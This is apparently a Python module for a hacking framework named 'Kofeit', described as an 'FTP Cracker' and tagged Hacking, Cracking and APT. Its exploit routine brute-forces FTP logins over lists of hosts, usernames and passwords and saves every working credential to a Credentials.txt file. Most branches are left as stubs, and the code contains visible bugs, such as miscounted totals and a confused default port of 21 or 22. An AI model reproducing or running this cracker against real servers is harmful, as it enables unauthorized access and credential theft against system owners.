#PLATFORM "[ANDROID,LINUX,Windows,Dos,Mac]" #KOFEIT#
#PACKAGE "FTP-1" #KOFEIT#
#TYPE "[Hacking,Pentest,Cracking,APT]" #KOFEIT#
#VERSION "1.0" #KOFEIT#
#LANGUAGE "Python" #KOFEIT#
#AUTHOR "SINOCE" #KOFEIT#
#TYPE_RUN "REMOTE" #KOFEIT#
#USY 2 #KOFEIT#
from Kofeit import *
import ftplib

class KOFEIT():
    
    def __init__(self):
        self.module_info = {
            "module_type":{
                "Hacking":True,
                "Cracking":True,
                "PenTest":True,
                "SessionHijacking":False,
                "CSRF":False,
                "APT":True
            },

            "platform_target":
                """
    Android:Supported(Only Termux)
    Linux:Supported
    Windows":"Supported
    Dos:Supported
    Mac:Supported
                """,
            "module-language":"Python",
            "ctime":"1402/12/24 21:50",
            "version":"1.0"

        }
        self.module_name = "FTP-1 #KOFEIT#"
        self.options_types = {
            "HostList":"<class 'str'>",
            "UserList":"<class 'str'>",
            "PassList":"<class 'str'>",
            "Username":"<class 'str'>",
            "Password":"<class 'str'>",
            "HostName":"<class 'str'>",
            "PortFTP":"<class 'str'>"

        }
        self.options = {
            "HostList":"",
            "UserList":"",
            "PassList":"",
            "Username":"",
            "Password":"",
            "HostName":"",
            "PortFTP":21
            }
        self.rq = {}
        self.author_module = "Sinoce-HSC"
        self.description = "Only FTP Cracker Easy."
        def info(self):
            language = self.module_info["module-language"]
            platform = self.module_info["platform_target"]
            ctime = self.module_info['ctime']
            version  = self.module_info['version']
            print_status("#6[#2*#6] #0" + f"Module-Name:{self.module_name}\nLanguage-Module:{language}\nPlatform-Supported:\n[\n{platform}\n]\nDescription:{self.description}\nAuthor:{self.author_module}\nTime-Created:{ctime}\nVersion:{version}", True)
    def check_variable(self,var):
        if var:return True
        else:return False
    def show_options(self):
        HostList:list=self.options['HostList']
        UserList:list=self.options['UserList']
        PassList:list=self.options['PassList']
        Username:str=self.options['Username']
        Password:str=self.options['Password']
        HostName:str=self.options['HostName']
        PortFTP:int=self.options['PortFTP']

        if not HostList:self.HostList="Null";self.HL  = False
        else:self.HL = True

        if not UserList:self.UserList="Null";self.UL  = False
        else:self.UL = True

        if not PassList:self.PassList="Null";self.PL  = False
        else:self.PL = True

        if not Username:self.Username="Null";self.UN  = False
        else:self.UN = True

        if not Password:self.Password="Null";self.PW  = False
        else:self.PW = True

        if not HostName:self.HostName="Null";self.HN  = False
        else:self.HN = True

        if not PortFTP:PortFTP=22;self.PFTP = False
        else:self.PFTP = True
        
        print_status("-"*5 +f"LIST Options:" + "-"*5+"\n"+ f"""HostList : {self.options['HostList']} [{self.check_variable(self.options['HostList'])}]\nUserList : {self.options['UserList']} [{self.check_variable(self.options['UserList'])}]\nPassList : {self.options['PassList']} [{self.check_variable(self.options['PassList'])}]\n""" +"-"*5 +"String Options:" + "-"*5+"\n"+ f"""HostName : {self.options['HostName']} [{self.check_variable(self.options['HostName'])}]\nUsername : {self.options['Username']} [{self.check_variable(self.options['Username'])}]\nPassword:{self.options['Password']} [{self.check_variable(self.options['Password'])}]\nPortFTP:{self.options['PortFTP']} [{self.check_variable(self.options['PortFTP'])}]\n""", True)
    def set_value(self,key,value):
        if key in self.options:
            if self.options_types[key] == "<class 'list'>"  and str(type(value)) == "<class 'str'>":
                value = value.split(",")
                self.options[key] = value
                value_str = '[ ' + " | ".join(value) + ' ]'
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value_str}#0",True)
            elif self.options_types[key] == "<class 'str'>" and str(type(value)) == "<class 'str'>":
                self.options[key] = value
                print_status("#6[#2*#6] #0" + f"#1{key} #3=#2>#66 {value}#0",True)
            else:
                print_no(f"#4Type#2 {key}#3 Is #1{self.options_types[key]} #2can't #22set #5 > #22{str(type(value))}#0",True)
        else:
            print_no(f"#1{key}#22 Invalid #66(#1{key}#66) #4Not#3 Found #2!#0",True)
    def help(self):
        print_status(f"""
#2info #3ARGS#5[#22None#5] #6(#55Show info Module #11{self.module_name.split(" ")[0]}#6)
#2set #3/ #2set_value #3ARGS#5[#2<#1KEY#2> #2<#1VALUE#2>#5] #6(#55Set A Key To Value#6)
#2show options #3/ #2show_options #3ARGS#5[#22None#5] #6(#55Show the options Module #11{self.module_name.split(" ")[0]}#6)
#2check #3ARGS#5[#22None#5] #6(#55Check Options Seted and Module #11{self.module_name.split(" ")[0]}#6)
#2exploit #3/ #2run #3ARGS#5[#22None#5] #6(#55run the module #11{self.module_name.split(" ")[0]}#6)""",True)
    def check(self):
        if self.check_variable(self.options['HostList']):
            if os.path.isfile(self.options['HostList']):
                HostList = open(self.options['HostList']).read().splitlines()
                if len(HostList) > 0 and HostList:
                    print_ok("HostList Verifyed .",True)
                    self.rq['HOST'] = "HostList"
                else:
                    print_status("#6[#2*#6] #0" + "#11HostList #2Invalid #1Verifyed #3!", True)
            else:
                print_no("HostList File Not Exist !",True)
        elif self.check_variable(self.options['HostName']):
            if len(self.options['HostName']) > 0 and self.options['HostName']:
                print_ok("HostName Verifyed .",True)
                self.rq['HOST'] = "HostName"
            else:
                print_status("#6[#2*#6] #0" + "#22HostName #2Invalid #1Verifyed #3!", True)
        else:
            print_no("#66[#1Host#66] #2Is #4 Required #2!#0")

        if self.check_variable(self.options['UserList']):
            if os.path.isfile(self.options['UserList']):
                UserList = open(self.options['UserList']).read().splitlines()
                if len(UserList) > 0 and UserList:
                    print_ok("UserList Verifyed .",True)
                    self.rq['USER'] = "UserList"
                else:
                    print_status("#6[#2*#6] #0" + "#22UserList #2Invalid #1Verifyed #3!", True)
            else:
                print_no("UserList File Not Exist",True)
        elif self.check_variable(self.options['Username']):
            if len(self.options['Username']) > 0 and self.options['Username']:
                print_ok("Username Verifyed .",True)
                self.rq['USER'] = "Username"
            else:
                print_status("#6[#2*#6] #0" + "#22Username #2Invalid #1Verifyed #3!", True)
        else:
            print_no("#2<#1Username#2> #22Is #4 Required #2!#0")
        
        if self.check_variable(self.options['PassList']) :
            if os.path.isfile(self.options['PassList']):
                PassList = open(self.options['PassList']).read().splitlines()
                if len(PassList) > 0 and PassList:
                    print_ok("PassList Verifyed .",True)
                    self.rq['PASS'] = "PassList"
                else:
                    print_status("#6[#2*#6] #0" + "#22PassList #2Invalid #1Verifyed #3!", True)
            else:
                print_no("PassList File Not Exist",True)
        elif self.check_variable(self.options['Password']) :
            if len(self.Password) > 0 and self.Password:
                print_ok("Password Verifyed .",True)
                self.rq['PASS'] = "Password"
            else:
                print_status("#6[#2*#6] #0" + "#22Password #2Invalid #1Verifyed #3!", True)
        else:
            print_no("#2<#Password#2> #22Is #4 Required #2!#0")
        
        if self.check_variable(self.options['PortFTP']) :
            if self.options['PortFTP']:
                print_ok("PortFTP Verifyed .",True)
            else:
                print_status("#6[#2*#6] #0" + "#PortFTP #2Invalid #1Verifyed #3!", True)
                print_status("#6[#2*#6] #0" + "PortFTP Is default=22", True)
                self.options['PortFTP'] = 21
        else:
            print_status("#6[#2*#6] #0" + "PortFTP Is default=22", True)

        if self.check_variable(self.options['PortFTP']) :
            print_ok("PortFTP Not Empty .",True)
    def exploit(self):
        Host_Cracked:list = []
        number_credentials = {'USER':0,'PASS':0,'HOST':0}
        nu,np,nh = 1, 1, 1
        path_credentials = os.path.join(os.getcwd(), "Credentials.txt")
        HK,UK,PK = self.rq['HOST'],self.rq['USER'],self.rq['PASS']
        if HK == "HostList":
            if UK == "UserList":
                if PK == "PassList":
                    HostList = open(self.options[HK]).read().splitlines();number_credentials["HOST"] = len(HostList)
                    UserList = open(self.options[UK]).read().splitlines();number_credentials["HOST"] = len(UserList)
                    PassList = open(self.options[PK]).read().splitlines();number_credentials["HOST"] = len(PassList)
                    for Host in HostList:
                        for User in UserList:
                            for Pass in PassList:
                                client = ftplib.FTP()
                                try:
                                    client.connect(Host, self.options['PortFTP'], timeout=15)
                                    client.login(User,Pass)
                                except ftplib.error_perm:
                                    print_no(f"#2Invalid #3Credentials [HOST:({nh}/{number_credentials['HOST']}) USER:({nu}/{number_credentials['USER']}) PASS:({np}/{number_credentials['PASS']})] #0",True)
                                else:
                                    module_name = self.module_name.split(" "[0])
                                    open(path_credentials,"ab+").write("=".encode()*30 + f"\n{module_name}\nHost:{Host}\nUSER:{User}\nPASS:{Pass}\n".encode() + "=".encode()*30)
                                    print_ok(f"Host:{Host} Cracked \nCredentials Saved on 'Credentials.txt'",True)
                                    Host_Cracked.append(Host)
                                np+=1
                            nu+=1
                        nh+=1
                elif PK == "Password":
                    ...
            elif UK == "Username":
                if PK == "PassList":
                    ...
                elif PK == "Password":
                    ...
        elif HK == "HostName":
            if UK == "UserList":
                if PK == "PassList":
                    ...
                elif PK == "Password":
                    ...
            elif UK == "Username":
                if PK == "PassList":
                    ...
                elif PK == "Password":
                    ...
        else:
            print_star("#1Host#2 Is #4Required #5!",True)